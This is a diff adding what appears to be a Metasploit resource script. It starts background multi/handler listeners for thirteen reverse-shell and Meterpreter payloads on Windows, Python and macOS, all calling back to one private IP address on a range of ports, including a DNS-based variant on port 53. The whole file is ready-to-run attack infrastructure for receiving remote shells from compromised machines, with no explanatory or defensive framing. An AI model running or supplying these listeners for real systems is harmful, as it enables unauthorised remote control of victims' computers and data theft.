@@ -1,0 +1,78 @@
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.230.7
+set LPORT 2551
+set ExitOnSession false
+exploit -j
+
+set payload windows/meterpreter_reverse_tcp
+set LHOST 192.168.230.7
+set LPORT 1545
+set ExitOnSession false
+exploit -j
+
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.230.7
+set LPORT 2322
+set ExitOnSession false
+exploit -j
+
+set payload windows/x64/meterpreter_reverse_tcp
+set LHOST 192.168.230.7
+set LPORT 5141
+set ExitOnSession false
+exploit -j
+
+set payload windows/shell/reverse_tcp
+set LHOST 192.168.230.7
+set LPORT 2323
+set ExitOnSession false
+exploit -j
+
+set payload windows/shell_reverse_tcp
+set LHOST 192.168.230.7
+set LPORT 3444
+set ExitOnSession false
+exploit -j
+
+set payload windows/x64/shell/reverse_tcp
+set LHOST 192.168.230.7
+set LPORT 3245
+set ExitOnSession false
+exploit -j
+
+set payload windows/x64/shell_reverse_tcp
+set LHOST 192.168.230.7
+set LPORT 5415
+set ExitOnSession false
+exploit -j
+
+set payload python/meterpreter/reverse_tcp
+set LHOST 192.168.230.7
+set LPORT 5551
+set ExitOnSession false
+exploit -j
+
+set payload python/shell_reverse_tcp
+set LHOST 192.168.230.7
+set LPORT 5454
+set ExitOnSession false
+exploit -j
+
+set payload osx/x86/shell_reverse_tcp
+set LHOST 192.168.230.7
+set LPORT 3133
+set ExitOnSession false
+exploit -j
+
+set payload osx/x64/shell_reverse_tcp
+set LHOST 192.168.230.7
+set LPORT 4544
+set ExitOnSession false
+exploit -j
+
+set payload windows/shell/reverse_tcp_dns
+set LHOST 192.168.230.7
+set LPORT 53
+set ExitOnSession false 
+exploit -j
